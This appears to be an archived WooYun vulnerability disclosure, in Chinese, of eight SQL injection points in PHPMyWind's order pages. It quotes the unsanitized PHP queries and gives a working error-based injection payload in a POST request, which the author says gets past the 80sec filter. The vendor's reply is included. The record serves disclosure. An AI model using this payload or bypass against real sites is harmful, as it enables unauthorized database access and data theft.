{"id": 49958, "wybug_id": "wooyun-2014-079492", "wybug_title": "PHPMyWind某处设计失误导致7-8处SQL注入", "wybug_corp": "phpmywind.com", "wybug_author": "linadmin", "wybug_date": "2014-10-15 17:34", "wybug_open_date": "2015-01-13 17:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-13：\t细节向公众公开  简要描述： PHPMyWind某处设计失误导致7-8处SQL注入 详细说明：  经过简单审核发现phpmywind的一个漏洞集群，其实是设计原因导致的，总共会导致8处SQL注入，涉及的文件有两个分别是order.php 和 orderenter.php。漏洞核心在于$orderinfo在传输值的时候没有经过SQL注入的过滤。详述如下：首先进入order.php，该页面用于填写商品订单信息，这里就生成了一个$orderinfo这个变量。if($action == 'save'){\t\t//检测数据完整性\tif($username         == '' or\t   $truename         == '' or\t   $telephone        == '' or\t   $zipcode          == '' or\t   $postarea_prov    == '-1' or\t   $address          == '' or\t   $idcard           == '' or\t   $postmode         == '-1' or\t   $paymode          == '-1' or\t   $getmode          == '-1'\t  )\t{\t\theader('location:order.php');\t\texit();\t} \t//HTML转义变量\t$username  = htmlspecialchars($username);\t$truename  = htmlspecialchars($truename);\t$idcard    = htmlspecialchars($idcard);\t$telephone = htmlspecialchars($telephone);\t$zipcode   = htmlspecialchars($zipcode);\t$address   = htmlspecialchars($address);\t$buyremark = htmlspecialchars($buyremark);\t$posttime  = time(); \t$postarea_prov    = empty($postarea_prov)    ? '-1' : $postarea_prov;\t$postarea_city    = empty($postarea_city)    ? '-1' : $postarea_city;\t$postarea_country = empty($postarea_country) ? '-1' : $postarea_country;\t$orderinfo = array('truename'  => $truename,\t\t\t\t\t   'telephone' => $telephone,\t\t\t\t\t   'zipcode'   => $zipcode,\t\t\t\t\t   'postarea_prov' => $postarea_prov,\t\t\t\t\t   'postarea_city' => $postarea_city,\t\t\t\t\t   'postarea_country' => $postarea_country,\t\t\t\t\t   'address'   => $address,\t\t\t\t\t   'idcard'    => $idcard,\t\t\t\t\t   'postmode'  => $postmode,\t\t\t\t\t   'paymode'   => $paymode,\t\t\t\t\t   'getmode'   => $getmode,\t\t\t\t\t   'buyremark' => $buyremark,\t\t\t\t\t   'posttime'  => $posttime);\t//存入COOKIE\tsetcookie('orderinfo', AuthCode(serialize($orderinfo),'ENCODE'));\theader('location:orderenter.php');\texit();} Phpmywind可以在url中定义变量，因此orderinfo中数组中每个变量都可以通过URL参数进行设定，但是注意，这里并没有进行任何SQL注入字符过滤操作，htmlspecialchar只能解决XSS！！！然后把$orderinfo加密后存放到cookie的orderinfo字段中，转到orderenter.php页面漏洞来了！！！这个页面中大量使用了orderinfo数组中的变量1.$r = $dosql->GetOne(\"SELECT `postprice` FROM `#@__postmode` WHERE `id`=\".$orderinfo['postmode']);2.$sql = \"INSERT INTO `#@__goodsorder` (username, attrstr, truename, idcard, telephone, zipcode, postarea_prov, postarea_city, postarea_country, address, ordernum, postmode, paymode, getmode, weight, cost, amount, buyremark, posttime, orderid, checkinfo) VALUES ('$username', '$attrstr', '\".$orderarr['truename'].\"', '\".$orderarr['idcard'].\"', '\".$orderarr['telephone'].\"', '\".$orderarr['zipcode'].\"', '\".$orderarr['postarea_prov'].\"', '\".$orderarr['postarea_city'].\"', '\".$orderarr['postarea_country'].\"', '\".$orderarr['address'].\"', '$ordernum', '\".$orderarr['postmode'].\"', '\".$orderarr['paymode'].\"', '\".$orderarr['getmode'].\"', '\".$orderarr['totalweight'].\"', '\".$orderarr['cost'].\"', '\".$orderarr['totalprice'].\"', '\".$orderarr['buyremark'].\"', '\".$orderarr['posttime'].\"', '$orderid', 'confirm')\";3.$r = $dosql->GetOne(\"SELECT `dataname` FROM `#@__cascadedata` WHERE `datagroup`='area' AND level=0 AND `datavalue`=\".$orderinfo['postarea_prov']); 4.$r = $dosql->GetOne(\"SELECT `dataname` FROM `#@__cascadedata` WHERE `datagroup`='area' AND level=1 AND `datavalue`=\".$orderinfo['postarea_city']); 5.$r = $dosql->GetOne(\"SELECT `dataname` FROM `#@__cascadedata` WHERE `datagroup`='area' AND level=2 AND `datavalue`=\".$orderinfo['postarea_country']); 6.$r = $dosql->GetOne(\"SELECT `classname`,`postprice` FROM `#@__postmode` WHERE `id`=\".$orderinfo['postmode']); 7.$r = $dosql->GetOne(\"SELECT `classname` FROM `#@__paymode` WHERE `id`=\".$orderinfo['paymode']);8.$r = $dosql->GetOne(\"SELECT `classname` FROM `#@__getmode` WHERE `id`=\".$orderinfo['getmode']); ，共有8处，而这8处均可以作为SQL注入的注入点。我以paymode变量注入为例$r = $dosql->GetOne(\"SELECT `classname` FROM `#@__paymode` WHERE `id`=\".$orderinfo['paymode']); 解释并验证漏洞存在性首先我注册一个用户 然后进到goods.php中随意选中一件物品点击加入购物车，然后点击结算购物车，选中物品点击下一步，进入到order.php页面然后通过firefox浏览器构造SQL注入payload具体：url: http://127.0.0.1/phpmywind/order.phppost数据：truename=11111111&telephone=11111111111111&zipcode=11111111&postarea_prov=1500&postarea_city=1501&postarea_country=-1&address=11111111111111&idcard=11111111111111&postmode=2&paymode=1 and 1=2 and char(@`'`)=(SELECT 1 FROM (SELECT COUNT(*),CONCAT(FLOOR(RAND(0)*2),(SELECT CONCAT(0x5f,DATABASE(),0x5f,USER(),0x5f,VERSION())))a FROM information_schema.tables GROUP BY a)b)# and '1'='1&getmode=1&buyremark=111111111111111&username=listen1&amount=5499&weight=0.35&action=save虽然phpmywind使用了80sec防注入，但是依旧可以绕过。其实就是截取正常数据包然后修改paymode变量为错误回显注入的代码点击发送查看结果： \n\n没有问题，之前被这个80sec弄得好惨，仔细研究过才绕过，苦逼啊。。。就这样了。其他7处漏洞原理一模一样，不再赘述。有问题联系franklin1990@126.com.    漏洞证明：  \n\n验证流程如上   修复方案：  过滤参数吧   版权声明：转载请注明来源 linadmin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-10-16 15:37 厂商回复： 感谢提交漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}